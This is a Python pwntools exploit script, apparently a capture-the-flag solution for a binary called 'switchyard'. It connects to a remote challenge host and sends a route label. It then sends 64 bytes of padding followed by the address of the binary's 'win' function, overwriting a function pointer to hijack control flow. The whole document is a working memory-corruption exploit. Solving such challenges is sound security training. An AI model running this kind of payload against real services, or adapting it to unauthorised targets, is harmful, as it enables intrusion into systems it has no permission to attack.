from pwn import *

HOST = "95.216.124.220"
PORT = 30882
BINARY = "./switchyard"

context.arch = "amd64"
context.log_level = "info"

e = ELF(BINARY, checksec=False)

WIN          = e.sym['win']
ROUTE_LOCAL  = e.sym['route_local']

log.info(f"win         @ {hex(WIN)}")
log.info(f"route_local @ {hex(ROUTE_LOCAL)}")


OFFSET_FPTR1 = 0x40

input1 = b"local\n"

input2  = b"A" * OFFSET_FPTR1
input2 += p64(WIN)

log.info(f"Input 1 : {input1}")
log.info(f"Input 2 ({len(input2)} bytes): {input2.hex()}")

io = remote(HOST, PORT)

io.recvuntil(b"Route label: ")
io.send(input1)

io.recvuntil(b"Maintenance packet: ")
io.send(input2)

output = io.recvall(timeout=3)
print()
print(output.decode(errors='replace'))
